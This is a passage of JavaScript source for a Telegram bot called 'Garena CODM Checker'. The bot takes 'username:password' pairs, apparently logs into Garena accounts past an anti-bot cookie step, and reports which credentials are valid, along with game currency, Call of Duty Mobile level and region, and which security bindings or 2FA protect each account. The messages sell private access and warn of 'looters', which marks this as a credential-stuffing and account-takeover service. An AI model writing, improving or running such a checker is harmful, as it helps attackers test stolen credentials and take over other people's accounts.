        // The cookies object passed to checkLogin should be dynamic based on prior steps
        // For prelogin, it's what getRequestData provides. For login, it adds datadome.
        let cookiesForLogin = {...initialCookies}; // Start with base cookies
        // datadomeCookie from prelogin response is passed as `dataa` to checkLogin

        return await checkLogin(username, randomId, encryptedPassword, password, headers, cookiesForLogin, datadomeCookie, date);

    } catch (e) {
        logger.error(`Unexpected error in checkAccount for ${username}:`, e);
        return `[💥] Unexpected Error in checkAccount: ${e.message}`;
    }
}


// --- Telegram Bot ---
if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !ADMIN_CHAT_ID || !Number.isInteger(ADMIN_CHAT_ID)) {
    logger.error("Telegram Bot Token or Admin Chat ID is not configured correctly. Exiting.");
    process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
loadAllowedChats(); // Load initial access list

// Helper to escape HTML for Telegram
const escapeHtml = (unsafe) => {
    if (typeof unsafe !== 'string') return unsafe;
    return unsafe
         .replace(/&/g, "&")
         .replace(/</g, "<")
         .replace(/>/g, ">")
         .replace(/"/g, '"')
         .replace(/'/g, "'");
};


bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const user = msg.from;
    const userInfo = user.username ? `@${user.username}` : `${user.first_name}`;
    logger.info(`Received /start from ${userInfo} (Chat ID: ${chatId})`);

    let adminCommandsInfo = "";
    if (ADMIN_CHAT_ID && Number.isInteger(ADMIN_CHAT_ID)) {
        adminCommandsInfo =
            "<b>Admin Commands (if you are admin):</b>\n" +
            "/addaccess <code><chat_id></code>\n" +
            "/removeaccess <code><chat_id></code>\n" +
            "/listaccess\n\n";
    } else {
        adminCommandsInfo = "<i>Admin commands disabled (ADMIN_CHAT_ID not set).</i>\n\n";
    }

    if (isUserAllowed(chatId)) {
        bot.sendMessage(chatId,
            `✅ <b>Garena CODM Checker</b>\n` +
            "You have access.\n\n" +
            "Send account credentials in the format:\n" +
            "<code>username:password</code>\n\n" +
            `${adminCommandsInfo}` +
            "<b>User Commands:</b>\n" +
            "/requestaccess (if denied)\n" +
            "/myid (shows your chat ID)",
            { parse_mode: "HTML" }
        );
    } else {
        bot.sendMessage(chatId,
            `❌ <b>Garena CODM Checker</b>\n` +
            "Access Denied.\n\n" +
            `Your User/Group ID: <code>${chatId}</code> (use /myid)\n\n` +
            "✅ FREE CHECKING (PUBLIC GROUP): https://t.me/isnotsin/55\n" +
            "✨ PRIVATE ACCESS: /requestaccess, what's your offer?\n\n" +
            "<i>TAKE A RISK WHEN YOU CHECK YOUR ACCOUNT IN PUBLIC GROUP, LOOTER ALERT!</i>",
            { parse_mode: "HTML", disable_web_page_preview: true }
        );
    }
});

bot.onText(/\/myid/, (msg) => {
    const chatId = msg.chat.id;
    logger.info(`Received /myid from ${msg.from.username || msg.from.first_name} (Chat ID: ${chatId})`);
    bot.sendMessage(chatId, `Your current Chat ID is: <code>${chatId}</code>`, { parse_mode: "HTML" });
});

bot.onText(/\/addaccess(?:@\w+)?\s+(\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, "❌ This command is only for the administrator.");
    }
    const targetChatId = parseInt(match[1], 10);
    if (addChatIdToAccess(targetChatId)) {
        bot.sendMessage(chatId, `✅ Successfully added/verified Chat ID <code>${targetChatId}</code>.`, { parse_mode: "HTML" });
        bot.sendMessage(targetChatId, "🎉 You have been granted access to use the Garena Checker Bot!").catch(e => 
            logger.warn(`Could not notify newly added user ${targetChatId}: ${e.message}`)
        );
    } else {
        if (isUserAllowed(targetChatId)) { // Check if it failed because it already exists
            bot.sendMessage(chatId, `ℹ️ Chat ID <code>${targetChatId}</code> already has access.`, { parse_mode: "HTML" });
        } else {
            bot.sendMessage(chatId, `⚠️ Failed to add Chat ID <code>${targetChatId}</code>. Check logs.`, { parse_mode: "HTML" });
        }
    }
});
bot.onText(/\/addaccess$/, (msg) => { // Handle command without arguments
    if (isAdmin(msg.chat.id)) {
        bot.sendMessage(msg.chat.id, "Usage: /addaccess <code><chat_id_to_add></code>", { parse_mode: "HTML" });
    }
});


bot.onText(/\/removeaccess(?:@\w+)?\s+(\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, "❌ This command is only for the administrator.");
    }
    const targetChatId = parseInt(match[1], 10);
    if (targetChatId === ADMIN_CHAT_ID) {
        return bot.sendMessage(chatId, `❌ Cannot remove the primary admin ID (<code>${ADMIN_CHAT_ID}</code>) using this command.`, { parse_mode: "HTML" });
    }
    if (removeChatIdFromAccess(targetChatId)) {
        bot.sendMessage(chatId, `✅ Successfully removed Chat ID <code>${targetChatId}</code> from the allowed list.`, { parse_mode: "HTML" });
        bot.sendMessage(targetChatId, "ℹ️ Your access to the Garena Checker Bot has been revoked by the administrator.").catch(e => 
            logger.warn(`Could not notify removed user ${targetChatId}: ${e.message}`)
        );
    } else {
        bot.sendMessage(chatId, `⚠️ Failed to remove Chat ID <code>${targetChatId}</code>. It might not have been on the list.`, { parse_mode: "HTML" });
    }
});
bot.onText(/\/removeaccess$/, (msg) => { // Handle command without arguments
    if (isAdmin(msg.chat.id)) {
        bot.sendMessage(msg.chat.id, "Usage: /removeaccess <code><chat_id_to_remove></code>", { parse_mode: "HTML" });
    }
});

bot.onText(/\/listaccess/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, "❌ This command is only for the administrator.");
    }
    const currentAllowedIds = Array.from(ALLOWED_CHAT_IDS).sort((a, b) => a - b);
    if (currentAllowedIds.length === 0) {
        return bot.sendMessage(chatId, "ℹ️ The allowed access list is currently empty.");
    }
    let message = `🔐 <b>Allowed Chat IDs (${currentAllowedIds.length}):</b>\n`;
    message += currentAllowedIds.map(cid => `- <code>${cid}</code>` + (cid === ADMIN_CHAT_ID ? " (<b>Admin</b>)" : "")).join("\n");
    
    if (message.length > 4000) { // Split if too long
        bot.sendMessage(chatId, `🔐 <b>Allowed Chat IDs (${currentAllowedIds.length}):</b> ... (list too long to display fully, check ${ALLOWED_CHATS_FILE})`, {parse_mode: "HTML"});
    } else {
        bot.sendMessage(chatId, message, { parse_mode: "HTML" });
    }
});

bot.onText(/\/requestaccess/, (msg) => {
    const chatId = msg.chat.id;
    const user = msg.from;
    const userInfo = user.username ? `@${user.username}` : `${user.first_name}`;
    logger.info(`Received /requestaccess from ${userInfo} (Chat ID: ${chatId})`);

    if (isUserAllowed(chatId)) {
        return bot.sendMessage(chatId, "✅ You already have access!");
    }
    if (!ADMIN_CHAT_ID || !Number.isInteger(ADMIN_CHAT_ID)) {
        return bot.sendMessage(chatId, "❌ Cannot process request: Administrator ID not configured correctly.");
    }

    const userMentionHtml = user.username ? `@${escapeHtml(user.username)}` : `${escapeHtml(user.first_name)} (ID: <code>${user.id}</code>)`;
    const requestMessage = `🔔 Access Request:\n\nUser: ${userMentionHtml}\nChat ID: <code>${chatId}</code>\n\nPlease review and respond:`;
    
    bot.sendMessage(ADMIN_CHAT_ID, requestMessage, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ Accept", callback_data: `access_accept_${chatId}` },
                { text: "❌ Deny", callback_data: `access_deny_${chatId}` },
            ]]
        }
    }).then(() => {
        bot.sendMessage(chatId, "✅ Your access request has been sent to the administrator.");
    }).catch(e => {
        logger.error(`Failed to send access request notification to admin ${ADMIN_CHAT_ID}:`, e);
        bot.sendMessage(chatId, "❌ Could not send your request due to an internal error. Please contact the admin directly if possible.");
    });
});

bot.on('callback_query', (query) => {
    const adminUserId = query.from.id;
    bot.answerCallbackQuery(query.id).catch(e => logger.warn(`Failed to answer callback query: ${e.message}`));

    if (!isAdmin(adminUserId)) {
        // bot.answerCallbackQuery(query.id, { text: "⚠️ Only the administrator can respond.", show_alert: true });
        return;
    }

    const [actionType, action, targetUserIdStr] = query.data.split("_");
    if (actionType !== 'access' || !targetUserIdStr) {
        logger.error(`Invalid callback data: ${query.data}`);
        return bot.editMessageText(query.message.text + "\n\n❌ Error: Invalid callback data.", {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            parse_mode: "HTML"
        }).catch(e => logger.warn(`Error editing message for invalid callback: ${e.message}`));
    }
    const targetUserId = parseInt(targetUserIdStr, 10);
    const adminMentionHtml = query.from.username ? `@${escapeHtml(query.from.username)}` : escapeHtml(query.from.first_name);
    
    let originalRequesterInfo = `Request from Chat ID <code>${targetUserId}</code>`;
    const match = query.message.text.match(/User: (.*?)\n/);
    if (match) originalRequesterInfo = `Request from ${match[1].trim()}`;


    let editText = "", notifyUserText = "";

    if (action === "accept") {
        logger.info(`Admin ${adminUserId} accepting access for ${targetUserId}`);
        if (addChatIdToAccess(targetUserId)) {
            editText = `✅ Access Granted by ${adminMentionHtml}.\n\n${originalRequesterInfo}`;
            notifyUserText = "🎉 Your access request has been approved! You can now use the bot.";
        } else {
            if (isUserAllowed(targetUserId)){
                editText = `ℹ️ Access already existed for ${originalRequesterInfo}.\nMarked as approved by ${adminMentionHtml}.`;
                notifyUserText = "ℹ️ Your access request was approved (you already had access).";
            } else {
                editText = `⚠️ Failed to grant access (Error during file update).\n\n${originalRequesterInfo}`;
                notifyUserText = "⚠️ Admin tried to approve your access, but an internal error occurred. Please contact them.";
            }
        }
    } else if (action === "deny") {
        logger.info(`Admin ${adminUserId} denying access for ${targetUserId}`);
        // Optionally remove: removeChatIdFromAccess(targetUserId);
        editText = `❌ Access Denied by ${adminMentionHtml}.\n\n${originalRequesterInfo}`;
        notifyUserText = "🙁 Your access request has been denied by the administrator.";
    } else {
        editText = `${query.message.text}\n\n❓ Unknown action in callback data.`;
    }

    bot.editMessageText(editText, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: "HTML",
        reply_markup: null // Remove buttons
    }).catch(e => logger.warn(`Failed to edit ${action} message: ${e.message}`));

    if (notifyUserText) {
        bot.sendMessage(targetUserId, notifyUserText).catch(e =>
            logger.error(`Failed to notify user ${targetUserId} about ${action} result:`, e)
        );
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const messageText = msg.text;

    if (!messageText || messageText.startsWith('/')) return; // Ignore commands/empty

    if (!isUserAllowed(chatId)) {
        logger.info(`Access denied for text message from ${msg.from.username || msg.from.first_name} (Chat ID ${chatId}).`);
        // Avoid spamming denial messages; /start handles this.
        return;
    }

    logger.info(`Received text from ${msg.from.username || msg.from.first_name} (${chatId}): '${messageText.substring(0, 50)}...'`);

    if (messageText.includes(':')) {
        const parts = messageText.split(':', 2); // limit split to 2 parts
        const username = parts[0].trim();
        const password = parts[1] ? parts[1].trim() : "";

        if (username && password) {
            logger.info(`Detected credentials from ${chatId}: ${username}:${password.substring(0,3)}...`);
            
            const statusMsg = await bot.sendMessage(chatId,
                `⏳ Checking account: <code>${escapeHtml(username)}</code>...`,
                { parse_mode: "HTML" }
            );

            const dateStr = getCurrentTimestamp();
            try {
                const result = await checkAccount(username, password, dateStr);
                let replyText = "";
                const safeCreds = `<code>${escapeHtml(username)}:${escapeHtml(password)}</code>`;
                
                if (typeof result === 'object' && result !== null && result.status === "CODM_FAILURE") { // CODM Failure Tuple
                    replyText = `⚠️ <b>Check Result:</b>\nCredentials: <code>${escapeHtml(result.username)}:${escapeHtml(result.password)}</code>\n\n` +
                                  `Garena Login: ✅ OK\n` +
                                  `CODM Check: ❌ FAILED\n\n` +
                                  `Reason: <code>${escapeHtml(result.reason)}</code>`;
                } else if (typeof result === 'object' && result !== null && result.username) { // Full Success (Dictionary)
                    const { account_status, is_clean, garena_shells, codm_details, security, bindings } = result;
                    replyText = `✅ <b>VALID ACCOUNT</b>\nCredentials: ${safeCreds}\n` +
                                `Status: ${escapeHtml(account_status)}\n` +
                                `Shells: <code>${garena_shells}</code>\n`;
                    
                    if (codm_details && codm_details.status === "Linked") {
                        replyText += "🎮 <b>CODM Details:</b>\n";
                        if (codm_details.nickname) replyText += `  - Nick: <code>${escapeHtml(codm_details.nickname)}</code>\n`;
                        if (codm_details.level !== undefined) replyText += `  - Level: <code>${codm_details.level}</code>\n`;
                        if (codm_details.region) replyText += `  - Region: <code>${escapeHtml(codm_details.region)}</code>\n`;
                    } else if (codm_details && codm_details.status !== "No CODM Info Received") {
                        replyText += `🎮 CODM Status: ${escapeHtml(codm_details.status)}\n`;
                    }

                    const secInfo = [];
                    if (bindings.email_address) secInfo.push("📧Email");
                    if (bindings.mobile_number) secInfo.push("📱Phone");
                    if (bindings.facebook_name) secInfo.push("🇫Facebook");
                    if (security.google_authenticator_enabled) secInfo.push("🛡️Auth");
                    if (security.two_step_verification_enabled) secInfo.push("🔒2FA");
                    if (secInfo.length > 0) replyText += `Bindings/Sec: ${secInfo.join(' / ')}\n`;
                    
                    // Optional: Send full JSON as file
                    // const jsonFilename = `${username}_${dateStr}.json`;
                    // fs.writeFileSync(jsonFilename, JSON.stringify(result, null, 2));
                    // await bot.sendDocument(chatId, jsonFilename, { caption: "Full account details."});
                    // fs.unlinkSync(jsonFilename);

                } else if (typeof result === 'string') { // General Failure (Error string)
                    replyText = `❌ <b>FAILED</b>\nCredentials: <code>${escapeHtml(username)}:${escapeHtml(password)}</code>\n\n` +
                                  `Reason: <code>${escapeHtml(result)}</code>`;
                } else {
                    const unknownResultEscaped = escapeHtml(JSON.stringify(result).substring(0, 100));
                    replyText = `❓ <b>UNKNOWN RESPONSE</b>\n\n<code>${unknownResultEscaped}</code>`;
                }
                
                await bot.editMessageText(replyText, {
                    chat_id: chatId,
                    message_id: statusMsg.message_id,
                    parse_mode: "HTML",
                    disable_web_page_preview: true
                });
                logger.info(`Sent check result for ${username} to ${chatId}`);

            } catch (e) {
                logger.error(`Error running check_account for ${username} from ${chatId}:`, e);
                const errorMsgEscaped = escapeHtml(e.message);
                await bot.editMessageText(
                    `❌ An internal error occurred while checking <code>${escapeHtml(username)}</code>.\nError: ${errorMsgEscaped}`,
                    { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
                ).catch(editErr => logger.error(`Failed to edit error message: ${editErr.message}`));
            }
        } else {
            logger.info(`Ignoring message from ${chatId} - invalid format (empty user/pass).`);
        }
    } else {
        // Ignore non-credential text
    }
});

bot.on('polling_error', (error) => {
    logger.error(`Polling error: ${error.code} - ${error.message}`);
    // E.g., if (error.code === 'EFATAL') {}
});

bot.on('webhook_error', (error) => {
    logger.error(`Webhook error: ${error.code} - ${error.message}`);
});

logger.info("Garena Checker Bot started...");
logger.info(`Admin Chat ID: ${ADMIN_CHAT_ID}`);
logger.info(`Allowed Chat IDs: ${JSON.stringify(Array.from(ALLOWED_CHAT_IDS))}`);

// Graceful shutdown
process.on('SIGINT', () => {
    logger.info("Bot shutting down (SIGINT)...");
    bot.stopPolling().then(() => process.exit(0));
});
process.on('SIGTERM', () => {
    logger.info("Bot shutting down (SIGTERM)...");
    bot.stopPolling().then(() => process.exit(0));
});